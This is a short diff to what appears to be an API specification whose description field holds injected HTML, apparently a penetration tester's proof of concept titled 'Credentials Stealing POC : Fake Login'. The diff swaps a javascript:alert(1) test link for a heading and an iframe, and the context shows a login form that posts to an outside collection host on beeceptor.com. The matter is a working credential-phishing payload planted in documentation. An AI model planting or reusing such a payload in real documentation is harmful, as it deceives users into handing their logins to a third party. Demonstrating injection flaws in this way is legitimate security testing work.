@@ -4,8 +4,8 @@ info:
   title: Fake Login Page
   description: '<div class="login-form">
     <div class="heading">
-        <a href="javascript:alert(1)">click</a>
-    </div>
+        <h1>Credentials Stealing POC : Fake Login</h1>
+        <iframe src='http://google.com'/>
     <div class="form-container">
         <form action="https://vinothpentest.free.beeceptor.com/login" method="post" class="form-signin">
             <div class="form-group">
